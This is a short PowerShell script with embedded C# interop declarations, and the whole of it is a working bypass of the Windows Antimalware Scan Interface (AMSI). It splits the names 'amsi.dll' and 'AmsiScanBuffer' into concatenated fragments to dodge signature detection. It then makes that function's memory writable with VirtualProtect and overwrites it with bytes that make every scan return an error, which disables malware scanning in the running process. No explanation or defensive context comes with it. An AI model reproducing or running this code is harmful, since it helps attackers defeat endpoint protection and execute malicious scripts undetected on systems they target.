$Doors23 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Doors23

$libToLoad = "a" + "m" + "si" + ".dll"
$asb = "A" + "m" + "s" + "i" + "Sc" + "an" + "B" + "u" + "ff" + "er"

$LoadLibrary = [Win32]::LoadLibrary($libToLoad)
$sserddA = [Win32]::GetProcAddress($LoadLibrary, $asb)
$qqq = 0
[Win32]::VirtualProtect($sserddA, [uint32]5, 0x40, [ref]$qqq)
$PieceOfTape = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($PieceOfTape, 0, $sserddA, 6)
